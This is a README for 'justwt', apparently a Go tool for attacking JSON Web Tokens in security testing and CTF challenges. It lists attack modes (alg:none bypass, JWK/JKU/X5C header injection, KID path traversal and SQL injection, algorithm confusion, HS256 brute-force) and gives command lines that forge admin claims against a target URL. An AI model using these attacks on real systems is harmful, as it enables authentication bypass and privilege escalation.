# Just Wreck Tokens (justwt)

![Version](https://img.shields.io/badge/version-1.0-brightmagenta.svg)
![Author](https://img.shields.io/badge/author-buzz-purple.svg)
![Language](https://img.shields.io/badge/language-Go-cyan.svg)

Comprehensive JWT attack tool for security testing & CTF challenges.

## Installation

```bash
git clone https://github.com/buzz/just-wreck-tokens
cd just-wreck-tokens
go build -o justwt .
sudo mv justwt /usr/local/bin/
```

Or use the alias directly:
```bash
justwt -h
```

## Quick Start

```bash
justwt -jwt $TOKEN -payload '{"admin":true}' -kid -url https://target/admin -v
```

## Attack Types

| Flag | Description |
|------|-------------|
| `-all` | Run all attack types |
| `-none` | Alg:none bypass (multiple case variations) |
| `-jwk` | JWK header injection (self-signed) |
| `-jku` | JKU header injection with auto-deploy |
| `-jku-encode` | Base64 encode JKU (bypass path filters) |
| `-kid` | KID path traversal `/dev/null` + SQL injection |
| `-alg-confusion` | RS256 → HS256 algorithm confusion |
| `-x5c` | X5C certificate chain injection |
| `-x5u-inject` | X5U certificate URL injection |
| `-brute` | HS256 brute-force with wordlist |
| `-payload-only` | Change payload, keep original signature |

## Examples

### KID Path Traversal
```bash
justwt -jwt $TOKEN -payload '{"sub":"admin"}' -kid -url https://target/admin
```

### JKU with Path Encoding Bypass
```bash
justwt -jwt $TOKEN -payload '{"admin":true}' -jku -jku-encode -url https://target
```

### Algorithm Confusion with sig2n
```bash
justwt -jwt $TOKEN1 -jwt $TOKEN2 -alg-confusion -sig2n-token2 $TOKEN2 -url https://target
```

### Brute-force HS256
```bash
justwt -jwt $TOKEN -payload '{"admin":true}' -brute -wordlist /path/to/wordlist.txt -url https://target
```

## Output Style

Tool uses color-coded annotations:
- `[+]` Success (Green)
- `[-]` Error (Red)
- `[x]` Failed/Skipped (Gray)
- `[~]` Info/Warning (Yellow)

## Features

✓ 10+ JWT attack types  
✓ Auto-surge.sh deployment  
✓ sig2n Docker integration  
✓ HTTP response analysis  
✓ Verbose mode  
✓ Color-coded output  

## Requirements

- Go 1.21+
- surge.sh CLI (optional, for auto-deploy)
- Docker (optional, for sig2n extraction)

## License

MIT

# Just-Wreck-Tokens
